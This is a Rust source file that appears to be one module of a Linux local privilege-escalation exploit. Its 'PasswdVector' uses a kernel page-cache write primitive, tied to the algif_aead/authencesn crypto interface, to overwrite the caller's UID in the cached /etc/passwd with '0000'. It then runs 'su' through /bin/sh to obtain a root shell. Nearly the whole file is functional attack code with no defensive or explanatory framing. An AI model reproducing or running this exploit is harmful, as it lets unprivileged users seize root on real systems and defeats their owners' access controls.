use crate::splice::CopyFail;
use crate::syscall::close_fd;
use crate::{Error, Vector};
use core::ptr;

pub struct PasswdVector;

const PASSWD_PATH_NUL: &[u8] = b"/etc/passwd\0";
const SHELL_PATH_NUL: &[u8] = b"/bin/sh\0";
const SH_ARG0_NUL: &[u8] = b"sh\0";
const SH_DASH_C_NUL: &[u8] = b"-c\0";
const PASSWD_BUF: usize = 65536;

const MIN_4DIGIT_UID: u32 = 1000;
const MAX_4DIGIT_UID: u32 = 9999;

/// Find the byte offset of the UID field for `username` in /etc/passwd content.
/// Returns the offset of the first byte of the UID field (after the 2nd colon).
pub fn find_uid_offset(body: &[u8], username: &[u8]) -> Option<usize> {
    if username.is_empty() {
        return None;
    }
    let mut line_start = 0usize;
    while line_start < body.len() {
        let line_end = match memchr_nl(&body[line_start..]) {
            Some(off) => line_start + off,
            None => body.len(),
        };
        let line = &body[line_start..line_end];
        if line.len() > username.len()
            && &line[..username.len()] == username
            && line[username.len()] == b':'
        {
            // Locate 1st colon (after username), 2nd colon (after password field).
            let colon1 = line_start + username.len();
            let colon2_rel = memchr_byte(&body[colon1 + 1..line_end], b':')?;
            let colon2 = colon1 + 1 + colon2_rel;
            // UID field starts at colon2 + 1.
            return Some(colon2 + 1);
        }
        if line_end >= body.len() {
            return None;
        }
        line_start = line_end + 1;
    }
    None
}

/// Format a UID 1000..=9999 as 4 ASCII bytes.
pub fn format_uid_4ascii(uid: u32) -> Option<[u8; 4]> {
    if !(MIN_4DIGIT_UID..=MAX_4DIGIT_UID).contains(&uid) {
        return None;
    }
    let mut out = [b'0'; 4];
    out[0] = b'0' + ((uid / 1000) % 10) as u8;
    out[1] = b'0' + ((uid / 100) % 10) as u8;
    out[2] = b'0' + ((uid / 10) % 10) as u8;
    out[3] = b'0' + (uid % 10) as u8;
    Some(out)
}

/// Locate the username for a given UID by scanning /etc/passwd content.
/// Returns the username slice on success. Skips malformed lines (fewer than
/// 3 colons) rather than aborting the whole scan.
pub fn find_username_for_uid(body: &[u8], uid: u32) -> Option<&[u8]> {
    let want = format_uid_4ascii(uid)?;
    let mut line_start = 0usize;
    while line_start < body.len() {
        let line_end = match memchr_nl(&body[line_start..]) {
            Some(off) => line_start + off,
            None => body.len(),
        };
        let line = &body[line_start..line_end];
        if let Some(colon1) = memchr_byte(line, b':') {
            let after1 = colon1 + 1;
            if let Some(colon2_rel) = memchr_byte(&line[after1..], b':') {
                let colon2 = after1 + colon2_rel;
                let after2 = colon2 + 1;
                if let Some(colon3_rel) = memchr_byte(&line[after2..], b':') {
                    let colon3 = after2 + colon3_rel;
                    let uid_field = &line[after2..colon3];
                    if uid_field == &want[..] {
                        return Some(&line[..colon1]);
                    }
                }
            }
        }
        if line_end >= body.len() {
            return None;
        }
        line_start = line_end + 1;
    }
    None
}

fn memchr_nl(s: &[u8]) -> Option<usize> {
    memchr_byte(s, b'\n')
}

fn memchr_byte(s: &[u8], b: u8) -> Option<usize> {
    let mut i = 0;
    while i < s.len() {
        if s[i] == b {
            return Some(i);
        }
        i += 1;
    }
    None
}

impl Vector for PasswdVector {
    fn name(&self) -> &'static str {
        "passwd"
    }

    fn applicable(&self) -> Result<bool, Error> {
        unsafe {
            let uid = libc::getuid();
            if !(MIN_4DIGIT_UID..=MAX_4DIGIT_UID).contains(&uid) {
                return Ok(false);
            }
            if libc::access(PASSWD_PATH_NUL.as_ptr() as *const _, libc::R_OK) != 0 {
                return Ok(false);
            }
        }
        let st = crate::check::check_kernel()?;
        Ok(st.algif_aead_module || st.authencesn_template)
    }

    fn execute(&self, primitive: &mut CopyFail) -> Result<(), Error> {
        let uid = unsafe { libc::getuid() };
        if !(MIN_4DIGIT_UID..=MAX_4DIGIT_UID).contains(&uid) {
            return Err(Error::InvalidArgument("uid not in 1000..=9999"));
        }

        let mut buf = [0u8; PASSWD_BUF];
        let n = read_passwd_into(&mut buf)?;
        let body = &buf[..n];

        let username = find_username_for_uid(body, uid).ok_or(Error::ParseError)?;
        let uid_off = find_uid_offset(body, username).ok_or(Error::ParseError)?;

        // Sanity-check: the 4 bytes at uid_off should match the ASCII uid.
        let want = format_uid_4ascii(uid).ok_or(Error::ParseError)?;
        if uid_off + 4 > body.len() || body[uid_off..uid_off + 4] != want {
            return Err(Error::ParseError);
        }

        // Open /etc/passwd RDONLY, prime cache, then mutate.
        unsafe {
            let fd = libc::open(PASSWD_PATH_NUL.as_ptr() as *const _, libc::O_RDONLY);
            if fd < 0 {
                return Err(Error::OpenFailed);
            }
            // Prime cache: read full content into a discard buffer.
            // splice() inside the primitive uses an explicit src_off=0, so
            // the file's internal offset after this read is irrelevant.
            let mut prime = [0u8; 4096];
            loop {
                let r = libc::read(fd, prime.as_mut_ptr() as *mut _, prime.len());
                if r <= 0 {
                    break;
                }
            }

            let res = primitive.write_buffer_at(fd, uid_off, b"0000");
            close_fd(fd);
            res?;
        }

        // Build "su <username>\0" in a stack buffer.
        let mut cmd = [0u8; 96];
        if username.len() + 4 > cmd.len() {
            return Err(Error::InvalidArgument("username too long"));
        }
        let mut p = 0usize;
        cmd[p] = b's';
        p += 1;
        cmd[p] = b'u';
        p += 1;
        cmd[p] = b' ';
        p += 1;
        cmd[p..p + username.len()].copy_from_slice(username);
        p += username.len();
        cmd[p] = 0;

        // execve("/bin/sh", ["sh","-c","su <user>", NULL], envp_min)
        // envp_min: PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
        let env_path: &[u8] =
            b"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\0";
        let argv: [*const u8; 4] = [
            SH_ARG0_NUL.as_ptr(),
            SH_DASH_C_NUL.as_ptr(),
            cmd.as_ptr(),
            ptr::null(),
        ];
        let envp: [*const u8; 2] = [env_path.as_ptr(), ptr::null()];
        unsafe {
            libc::execve(
                SHELL_PATH_NUL.as_ptr() as *const _,
                argv.as_ptr() as *const *const _,
                envp.as_ptr() as *const *const _,
            );
        }
        // Only reached if execve fails.
        Err(Error::Io)
    }
}

fn read_passwd_into(buf: &mut [u8]) -> Result<usize, Error> {
    unsafe {
        let fd = libc::open(PASSWD_PATH_NUL.as_ptr() as *const _, libc::O_RDONLY);
        if fd < 0 {
            return Err(Error::OpenFailed);
        }
        let mut total = 0usize;
        while total < buf.len() {
            let n = libc::read(fd, buf.as_mut_ptr().add(total) as *mut _, buf.len() - total);
            if n < 0 {
                close_fd(fd);
                return Err(Error::Io);
            }
            if n == 0 {
                break;
            }
            total += n as usize;
        }
        close_fd(fd);
        Ok(total)
    }
}
